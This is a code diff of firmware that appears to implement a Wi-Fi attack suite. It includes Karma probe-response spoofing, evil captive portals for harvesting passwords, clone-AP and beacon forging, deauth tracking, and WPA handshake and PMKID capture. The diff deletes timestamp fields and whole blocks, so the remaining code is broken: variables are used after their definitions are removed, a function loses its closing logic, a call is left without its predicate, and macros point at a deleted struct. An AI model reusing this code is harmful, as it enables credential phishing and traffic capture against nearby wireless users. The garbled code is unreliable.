@@ -508,7 +508,6 @@ void ActiveBroadcastAttack::launchAttackForResponse(const String &ssid, const St
     portal.ssid = ssid;
     portal.channel = currentChannel;
     portal.targetMAC = mac;
-    portal.timestamp = millis();
     portal.launched = false;
     portal.templateName = selectedTemplate.name;
     portal.templateFile = selectedTemplate.filename;
@@ -522,113 +521,6 @@ void ActiveBroadcastAttack::launchAttackForResponse(const String &ssid, const St
     if (enqueuePendingPortal(portal)) stats.successfulAttacks++;
 }
 
-struct KarmaRuntimeState {
-    uint8_t activePortalChannel = 0;
-    unsigned long deauthCount[14] = {0};
-    unsigned long lastDeauthReset = 0;
-    unsigned long lastBeaconBurst = 0;
-    uint8_t beaconsInBurst = 0;
-    QueueHandle_t karmaQueue = nullptr;
-    TaskHandle_t karmaWriterHandle = nullptr;
-    bool storageAvailable = true;
-    KarmaMode karmaMode = MODE_PASSIVE;
-    bool karmaPaused = false;
-    BackgroundPortal *activePortal = nullptr;
-    unsigned long lastPortalHeartbeat = 0;
-    bool handshakeCaptureEnabled = false;
-    std::vector<HandshakeCapture> handshakeBuffer;
-    std::map<uint32_t, ClientBehavior> clientBehaviors;
-    ActiveBroadcastAttack broadcastAttack;
-    unsigned long last_time = 0;
-    unsigned long last_ChannelChange = 0;
-    unsigned long lastFrequencyReset = 0;
-    unsigned long lastBeaconTime = 0;
-    unsigned long lastMACRotation = 0;
-    uint8_t channl = 0;
-    bool flOpen = false;
-    bool is_LittleFS = true;
-    uint32_t pkt_counter = 0;
-    bool auto_hopping = true;
-    uint16_t hop_interval = DEFAULT_HOP_INTERVAL;
-    File probe_file;
-    RingbufHandle_t macRingBuffer = nullptr;
-    String filen = "";
-    std::vector<ProbeRequest> probeBuffer;
-    uint16_t probeBufferIndex = 0;
-    bool bufferWrapped = false;
-    KarmaConfig karmaConfig = {};
-    AttackConfig attackConfig = {};
-    bool screenNeedsRedraw = false;
-    uint32_t pmkidCaptured = 0;
-    uint32_t assocBlocked = 0;
-    uint8_t channelActivity[14] = {0};
-    uint8_t currentPriorityChannel = 0;
-    unsigned long lastDeauthTime = 0;
-    unsigned long lastSaveTime = 0;
-    uint32_t totalProbes = 0;
-    uint32_t uniqueClients = 0;
-    uint32_t karmaResponsesSent = 0;
-    uint32_t deauthPacketsSent = 0;
-    uint32_t autoPortalsLaunched = 0;
-    uint32_t cloneAttacksLaunched = 0;
-    uint32_t beaconsSent = 0;
-    bool isPortalActive = false;
-    bool restartKarmaAfterPortal = false;
-    std::map<String, NetworkHistory> networkHistory;
-    std::queue<ProbeResponseTask> responseQueue;
-    std::vector<ActiveNetwork> activeNetworks;
-    std::map<String, uint32_t> macBlacklist;
-    uint8_t currentBSSID[6] = {0};
-    std::vector<PortalTemplate> portalTemplates;
-    PortalTemplate selectedTemplate;
-    bool templateSelected = false;
-    std::map<String, uint16_t> ssidFrequency;
-    std::vector<std::pair<String, uint16_t>> popularSSIDs;
-    std::vector<PendingPortal> pendingPortals;
-
-    KarmaRuntimeState() {
-        probeBuffer.resize(MAX_PROBE_BUFFER);
-        handshakeBuffer.reserve(20);
-        activeNetworks.reserve(MAX_CONCURRENT_SSIDS);
-        portalTemplates.reserve(MAX_PORTAL_TEMPLATES);
-        popularSSIDs.reserve(MAX_POPULAR_SSIDS);
-        pendingPortals.reserve(MAX_PENDING_PORTALS);
-    }
-
-    ~KarmaRuntimeState() {
-        for (auto &probe : probeBuffer) freeProbeFrame(probe);
-        if (activePortal != nullptr) {
-            delete activePortal->instance;
-            delete activePortal;
-            activePortal = nullptr;
-        }
-        if (macRingBuffer) {
-            vRingbufferDelete(macRingBuffer);
-            macRingBuffer = nullptr;
-        }
-        if (karmaQueue) {
-            vQueueDelete(karmaQueue);
-            karmaQueue = nullptr;
-        }
-        if (probe_file) probe_file.close();
-    }
-};
-
-static KarmaRuntimeState *gKarmaState = nullptr;
-
-static bool ensureKarmaState() {
-    if (gKarmaState != nullptr) return true;
-    gKarmaState = new (std::nothrow) KarmaRuntimeState();
-    return gKarmaState != nullptr;
-}
-
-static KarmaRuntimeState &state() {
-    if (!ensureKarmaState()) {
-        Serial.println("[KARMA] Failed to allocate runtime state");
-        while (true) delay(1000);
-    }
-    return *gKarmaState;
-}
 
 static void releaseKarmaState() {
     delete gKarmaState;
@@ -650,36 +542,7 @@ static bool samePendingPortal(const PendingPortal &a, const PendingPortal &b) {
 static bool enqueuePendingPortal(const PendingPortal &portal, bool prioritize) {
     auto &queue = pendingPortalsRef();
 
-    for (auto &existing : queue) {
-        if (!samePendingPortal(existing, portal)) continue;
-        existing.timestamp = portal.timestamp;
-        existing.priority = std::max(existing.priority, portal.priority);
-        existing.probeCount = std::max(existing.probeCount, portal.probeCount);
-        if (portal.tier > existing.tier) existing.tier = portal.tier;
-        existing.duration = std::max(existing.duration, portal.duration);
-        existing.verifyPassword = portal.verifyPassword;
-        existing.isDefaultTemplate = portal.isDefaultTemplate;
-        if (!portal.templateName.isEmpty()) existing.templateName = portal.templateName;
-        if (!portal.templateFile.isEmpty()) existing.templateFile = portal.templateFile;
-        return true;
-    }
 
-    if (queue.size() >= MAX_PENDING_PORTALS) {
-        auto worstIt =
-            std::min_element(queue.begin(), queue.end(), [](const PendingPortal &a, const PendingPortal &b) {
-                if (a.priority != b.priority) return a.priority < b.priority;
-                return a.timestamp < b.timestamp;
-            });
-        if (worstIt == queue.end()) return false;
-        if (portal.priority < worstIt->priority) return false;
-        if (portal.priority == worstIt->priority && portal.timestamp <= worstIt->timestamp) return false;
-        queue.erase(worstIt);
-    }
-
-    if (prioritize) queue.insert(queue.begin(), portal);
-    else queue.push_back(portal);
-    return true;
-}
 
 static void destroyActivePortal() {
     if (state().activePortal == nullptr) return;
@@ -711,7 +574,6 @@ static void destroyActivePortal() {
 #define handshakeBuffer (state().handshakeBuffer)
 #define clientBehaviors (state().clientBehaviors)
 #define broadcastAttack (state().broadcastAttack)
-#define last_time (state().last_time)
 #define last_ChannelChange (state().last_ChannelChange)
 #define lastFrequencyReset (state().lastFrequencyReset)
 #define lastBeaconTime (state().lastBeaconTime)
@@ -1039,8 +901,6 @@ void analyzeClientBehavior(const ProbeRequest &probe) {
         ClientBehavior behavior;
         behavior.fingerprint = probe.fingerprint;
         behavior.lastMAC = probe.mac;
-        behavior.firstSeen = probe.timestamp;
-        behavior.lastSeen = probe.timestamp;
         behavior.probeCount = 1;
         behavior.avgRSSI = probe.rssi;
         behavior.probedSSIDs.push_back(probe.ssid);
@@ -1051,7 +911,6 @@ void analyzeClientBehavior(const ProbeRequest &probe) {
         uniqueClients++;
     } else {
         ClientBehavior &behavior = it->second;
-        behavior.lastSeen = probe.timestamp;
         behavior.probeCount++;
         behavior.avgRSSI = (behavior.avgRSSI + probe.rssi) / 2;
         if (probe.channel >= 1 && probe.channel <= 14) {
@@ -1225,9 +1084,6 @@ size_t buildBeaconFrame(uint8_t *buffer, const String &ssid, uint8_t channel, co
     pos += 6;
     buffer[pos++] = 0x00;
     buffer[pos++] = 0x00;
-    static uint64_t timestamp = 0;
-    timestamp += 1024;
-    for (int i = 0; i < 8; i++) buffer[pos++] = (timestamp >> (8 * i)) & 0xFF;
     buffer[pos++] = 0x64;
     buffer[pos++] = 0x00;
     if (rsn.akmSuite > 0) {
@@ -1288,8 +1144,6 @@ void sendBeaconFrameHelper(const String &ssid, uint8_t channel) {
     pos += 6;
     beaconPacket[pos++] = 0x00;
     beaconPacket[pos++] = 0x00;
-    uint64_t timestamp = esp_timer_get_time() / 1000;
-    memcpy(&beaconPacket[pos], &timestamp, 8);
     pos += 8;
     beaconPacket[pos++] = 0x64;
     beaconPacket[pos++] = 0x00;
@@ -1429,10 +1283,6 @@ void processResponseQueue() {
     unsigned long now = millis();
     while (!responseQueue.empty()) {
         ProbeResponseTask &task = responseQueue.front();
-        if (now - task.timestamp > RESPONSE_TIMEOUT_MS) {
-            responseQueue.pop();
-            continue;
-        }
         uint8_t responseFrame[256];
         size_t frameLen = buildEnhancedProbeResponse(
             responseFrame, task.ssid, task.targetMAC, task.channel, task.rsn, false
@@ -1486,7 +1336,6 @@ void processQueuedProbeEvents() {
         strncpy(probe.ssid, event.ssid, sizeof(probe.ssid) - 1);
         probe.ssid[sizeof(probe.ssid) - 1] = '\0';
         probe.rssi = event.rssi;
-        probe.timestamp = event.timestamp;
         probe.channel = event.channel;
         probe.fingerprint = event.fingerprint;
 
@@ -1543,7 +1392,6 @@ void processQueuedProbeEvents() {
         portal.ssid = probe.ssid;
         portal.channel = probe.channel;
         portal.targetMAC = probe.mac;
-        portal.timestamp = millis();
         portal.launched = false;
         portal.templateName = selectedTemplate.name;
         portal.templateFile = selectedTemplate.filename;
@@ -1571,7 +1419,6 @@ void queueProbeResponse(const ProbeRequest &probe, const RSNInfo &rsn) {
     task.targetMAC = probe.mac;
     task.channel = probe.channel;
     task.rsn = rsn;
-    task.timestamp = millis();
     responseQueue.push(task);
     if (responseQueue.size() <= 3) processResponseQueue();
 }
@@ -1672,7 +1519,6 @@ void checkCloneAttackOpportunities() {
                 PendingPortal portal;
                 portal.ssid = ssidPair.first;
                 portal.channel = getBestChannel();
-                portal.timestamp = millis();
                 portal.launched = false;
                 portal.templateName = selectedTemplate.name;
                 portal.templateFile = selectedTemplate.filename;
@@ -2084,7 +1930,6 @@ void checkPendingPortals() {
         std::remove_if(
             pendingPortals.begin(),
             pendingPortals.end(),
-            [now](const PendingPortal &p) { return (now - p.timestamp > 300000); }
         ),
         pendingPortals.end()
     );
@@ -2098,7 +1943,6 @@ void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd)
         PendingPortal portal;
         portal.ssid = ssid;
         portal.channel = channel;
-        portal.timestamp = millis();
         portal.launched = false;
         portal.templateName = selectedTemplate.name;
         portal.templateFile = selectedTemplate.filename;
@@ -2148,7 +1992,6 @@ void handleBroadcastResponse(const String &ssid, const String &mac) {
                 portal.ssid = ssid;
                 portal.channel = pgm_read_byte(&karma_channels[channl % 14]);
                 portal.targetMAC = mac;
-                portal.timestamp = millis();
                 portal.launched = false;
                 portal.templateName = selectedTemplate.name;
                 portal.templateFile = selectedTemplate.filename;
@@ -2197,9 +2040,6 @@ void saveProbesToPCAP(FS &fs) {
 
         if (probe.frame_len == 0 || probe.frame == nullptr) continue;
 
-        uint32_t ts_sec = probe.timestamp / 1000;
-        uint32_t ts_usec = (probe.timestamp % 1000) * 1000;
-
         file.write((uint8_t *)&ts_sec, 4);
         file.write((uint8_t *)&ts_usec, 4);
         file.write((uint8_t *)&probe.frame_len, 4);
@@ -2245,8 +2085,6 @@ void saveHandshakeToFile(const HandshakeCapture &hs) {
 
     File file = fs->open(filename, FILE_APPEND);
     if (file) {
-        uint32_t ts_sec = hs.timestamp / 1000;
-        uint32_t ts_usec = (hs.timestamp % 1000) * 1000;
         file.write((uint8_t *)&ts_sec, 4);
         file.write((uint8_t *)&ts_usec, 4);
         uint32_t len = hs.frameLen;
@@ -2283,7 +2121,6 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
         memcpy(hs.bssid, frame + 16, 6);
         hs.ssid = "UNKNOWN";
         hs.channel = pgm_read_byte(&karma_channels[channl % 14]);
-        hs.timestamp = millis();
         hs.frameLen = pkt->rx_ctrl.sig_len;
         if (hs.frameLen > 256) hs.frameLen = 256;
         memcpy(hs.eapolFrame, pkt->payload, hs.frameLen);
@@ -2312,7 +2149,6 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     copyStringToBuffer(probe.mac, sizeof(probe.mac), mac);
     copyStringToBuffer(probe.ssid, sizeof(probe.ssid), ssid);
     probe.rssi = ctrl.rssi;
-    probe.timestamp = millis();
     probe.channel = pgm_read_byte(&karma_channels[channl % 14]);
     probe.fingerprint = fingerprint;
     probe.frame = nullptr;
@@ -2341,7 +2177,6 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
         copyStringToBuffer(event.mac, sizeof(event.mac), mac);
         copyStringToBuffer(event.ssid, sizeof(event.ssid), ssid);
         event.rssi = probe.rssi;
-        event.timestamp = probe.timestamp;
         event.channel = probe.channel;
         event.fingerprint = probe.fingerprint;
         event.rsn = rsn;
@@ -2420,93 +2255,6 @@ std::vector<ClientBehavior> getVulnerableClients() {
         }
     }
     return vulnerable;
-}
-
-void updateKarmaDisplay() {
-    unsigned long currentTime = millis();
-    if (currentTime - last_time > 1000) {
-        last_time = currentTime;
-
-        tft.fillRect(10, 45, tftWidth - 20, tftHeight - 70, bruceConfig.bgColor);
-        tft.setTextSize(1);
-        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-
-        int y = 45;
-        tft.setCursor(10, y);
-
-        if (karmaPaused) {
-            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
-            tft.setCursor(10, y);
-            tft.print("KARMA PAUSED");
-            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-            y += LH + 2;
-        }
-
-        padprint("Total:" + String(totalProbes));
-        padprint("Uniq:" + String(uniqueClients), 7);
-        padprint("Act:" + String(activeNetworks.size()), 13);
-        padprintln("Pend:" + String(pendingPortals.size()), 19);
-
-        padprint("Queue:" + String(responseQueue.size()));
-        padprint("Beac:" + String(beaconsSent), 7);
-        padprint("Karma:" + String(karmaResponsesSent), 13);
-        padprintln("Clone:" + String(cloneAttacksLaunched), 19);
-
-        padprint("Port:" + String(autoPortalsLaunched) + "/" + String(activePortalCount()));
-        padprint("HS:" + String(handshakeBuffer.size()), 10);
-        padprintln("PMKID:" + String(pmkidCaptured), 16);
-
-        padprint("Ch:" + String(pgm_read_byte(&karma_channels[channl % 14])));
-        String hopStatus = String(auto_hopping ? "Auto:" : "Man:") + String(hop_interval) + "ms";
-        padprintln(hopStatus, 7);
-
-        char macStr[18];
-        snprintf(
-            macStr,
-            sizeof(macStr),
-            "%02X:%02X:%02X:%02X:%02X:%02X",
-            currentBSSID[0],
-            currentBSSID[1],
-            currentBSSID[2],
-            currentBSSID[3],
-            currentBSSID[4],
-            currentBSSID[5]
-        );
-        padprint("MAC:" + String(macStr));
-
-        String modeText = "";
-        switch (karmaMode) {
-            case MODE_PASSIVE: modeText = "PASSIVE"; break;
-            case MODE_BROADCAST: modeText = "BROADCAST"; break;
-            case MODE_FULL: modeText = "FULL"; break;
-            default: modeText = "PASSIVE"; break;
-        }
-        padprintln(modeText, 3);
-
-        if (templateSelected && !selectedTemplate.name.isEmpty()) {
-            String templateText = "Template:" + selectedTemplate.name;
-            if (templateText.length() > 40) templateText = templateText.substring(0, 37) + "...";
-            padprintln(templateText);
-        }
-
-        if (activePortal != nullptr) {
-            unsigned long portalAge = currentTime - activePortal->launchTime;
-            unsigned long portalLeftMs = (portalAge >= PORTAL_MAX_IDLE) ? 0 : (PORTAL_MAX_IDLE - portalAge);
-            unsigned long portalLeftSec = portalLeftMs / 1000;
-
-            String portalText = "Active Portal: " + activePortal->ssid;
-            padprintln(portalText + "(" + String(portalLeftSec) + "s)");
-        }
-
-        if (broadcastAttack.isActive()) {
-            padprintln("Broadcast:" + broadcastAttack.getProgressString());
-        } else {
-            padprintln("");
-        }
-
-        tft.setCursor(10, tftHeight - 15);
-        tft.print("SEL/ESC:Menu | Prev/Next:Channel");
-    }
 }
 
 void saveNetworkHistory(FS &fs) {
@@ -3323,8 +3071,6 @@ void saveProbesToFile(FS &fs, bool compressed) {
                 int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                 const ProbeRequest &probe = probeBuffer[idx];
                 if (probeSSIDEmpty(probe) || probeSSIDEquals(probe, "*WILDCARD*")) continue;
-                uint32_t timestamp = probe.timestamp;
-                file.write((uint8_t *)&timestamp, 4);
                 file.write((uint8_t *)probe.mac, 17);
                 int8_t rssi = (int8_t)probe.rssi;
                 file.write((uint8_t *)&rssi, 1);
@@ -3348,7 +3094,6 @@ void saveProbesToFile(FS &fs, bool compressed) {
                 if (!probeSSIDEmpty(probe) && !probeSSIDEquals(probe, "*WILDCARD*")) {
                     file.printf(
                         "%lu,%s,%d,%d,\"%s\"\n",
-                        probe.timestamp,
                         probe.mac,
                         probe.rssi,
                         probe.channel,
